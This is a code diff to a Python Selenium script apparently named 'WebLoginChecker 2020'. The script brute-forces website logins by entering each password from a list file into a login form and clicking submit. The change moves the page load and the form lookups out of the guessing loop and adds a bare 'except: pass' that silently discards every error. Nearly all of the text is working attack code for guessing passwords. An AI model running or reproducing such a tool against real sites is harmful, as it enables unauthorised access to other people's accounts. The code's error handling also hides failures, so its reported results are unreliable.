@@ -37,13 +37,13 @@ def check_pass(website, username_selector, password_selector, login_button_selec
     pass_file = open(pass_list)
     try_count = 1
     browser = webdriver.Chrome(DRIVER_PATH)
+    browser.get(website)
     try:
+        user_entry = browser.find_element_by_css_selector(username_selector)
+        pass_entry = browser.find_element_by_css_selector(password_selector)
+        login_button = browser.find_element_by_css_selector(login_button_selector)
         for password in pass_file:
-            browser.get(website)
             sleep(1)
-            user_entry = browser.find_element_by_css_selector(username_selector)
-            pass_entry = browser.find_element_by_css_selector(password_selector)
-            login_button = browser.find_element_by_css_selector(login_button_selector)
             user_entry.send_keys(username)
             pass_entry.send_keys(password)
             login_button.click()
@@ -60,6 +60,8 @@ def check_pass(website, username_selector, password_selector, login_button_selec
         else:
             print('[x] Selector not found or Attempts were limited!')            
         return
+    except:
+        pass
 
 def main():
     BANNER = 'WebLoginChecker 2020 - by @lxndroc-@aoctut'
